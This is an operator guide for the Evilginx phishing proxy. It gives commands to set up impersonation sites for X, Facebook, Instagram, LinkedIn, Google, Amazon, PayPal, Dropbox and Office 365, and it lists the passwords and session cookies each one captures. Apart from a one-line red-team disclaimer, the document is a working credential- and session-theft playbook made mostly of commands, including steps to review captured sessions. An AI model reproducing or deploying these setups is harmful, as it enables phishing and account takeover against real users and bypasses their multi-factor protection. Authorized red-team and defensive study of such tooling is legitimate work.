# Evilginx Social Media Guide

Complete guide for using Evilginx with major social media platforms.

## ⚠️ LEGAL DISCLAIMER

**This tool is intended for authorized Red Team operations only.** Unauthorized use without prior written consent is illegal.

---

## Quick Start

```bash
# Launch Evilginx
./bin/evilginx -p ./phishlets

# In Evilginx shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable [platform]
landers create [platform]
server
```

---

## Supported Platforms

| Platform | Phishlet | Credentials | Tokens |
|----------|----------|-------------|--------|
| **X (Twitter)** | `twitter` | email, password | auth_token, ct0, twid |
| **Facebook** | `facebook` | email, pass | c_user, xs, fr, datr |
| **Instagram** | `instagram` | username, enc_password | sessionid, ds_user_id |
| **LinkedIn** | `linkedin` | session_key, session_password | li_at, JSESSIONID |
| **Google** | `google` | identifier, password | SID, HSID, SAPISID |
| **Amazon** | `amazon` | email, password | session-id, ubid-main |
| **PayPal** | `paypal` | login_email, login_password | navcmd, sess |
| **Dropbox** | `dropbox` | login, password | t, jar, locale |
| **Office 365** | `o365` | username, password | ESTSAUTH |

---

## 1. X (Twitter)

```bash
phishlets enable twitter
landers create twitter
```

**Tokens**: auth_token, ct0, twid, personalization_id  
**Login**: twitter.x.com/login

---

## 2. Facebook

```bash
phishlets enable facebook
landers create facebook
```

**Tokens**: c_user, xs, fr, datr, sb  
**Login**: www.facebook.com/login/

---

## 3. Instagram

```bash
phishlets enable instagram
landers create instagram
```

**Tokens**: sessionid, ds_user_id, csrftoken  
**Login**: www.instagram.com/accounts/login/

---

## 4. LinkedIn

```bash
phishlets enable linkedin
landers create linkedin
```

**Tokens**: li_at, JSESSIONID, bscookie, sl  
**Login**: www.linkedin.com/checkpoint/lg/login

---

## 5. Google/Gmail

```bash
phishlets enable google
landers create google
```

**Tokens**: SID, HSID, SAPISID, SSID, APISID, GAPS  
**Login**: accounts.google.com/ServiceLogin

---

## 6. Amazon

```bash
phishlets enable amazon
landers create amazon
```

**Tokens**: session-id, ubid-main, at-main  
**Login**: www.amazon.com/ap/signin

---

## 7. PayPal

```bash
phishlets enable paypal
landers create paypal
```

**Tokens**: navcmd, sess, pnt  
**Login**: www.paypal.com/signin

---

## 8. Dropbox

```bash
phishlets enable dropbox
landers create dropbox
```

**Tokens**: t, jar, locale, lid  
**Login**: www.dropbox.com/login

---

## 9. Office 365

```bash
phishlets enable o365
landers create o365
```

**Tokens**: ESTSAUTH, OIDC, mkt  
**Login**: login.microsoftonline.com

---

## All Commands Reference

```bash
# Configuration
config domain [domain]     # Set phishing domain
config ip [IP]             # Set server IP
config webhook_url [URL]   # Configure webhook

# Phishlets
phishlets                  # List all phishlets
phishlets enable [name]   # Enable a phishlet
phishlets disable [name]  # Disable a phishlet

# Landing Pages
landers                    # List landing pages
landers create [name]     # Create landing page
landers remove [ID]       # Remove landing page

# Sessions
sessions                   # List captured sessions
sessions [ID]             # Session details
sessions remove [ID]      # Remove session

# Server
server start              # Start server
server stop               # Stop server

# Other
help                      # Show help
quit                      # Exit
```

---

## Troubleshooting

```bash
# Check DNS
dig your-domain.com

# Check ports
netstat -tulpn | grep -E '443|53'

# Test URL
curl https://your-domain.com/[platform]/login

# Renew certificates
certbot renew
```

---

**VANTABLACK: Through the Looking Glass of Security.**
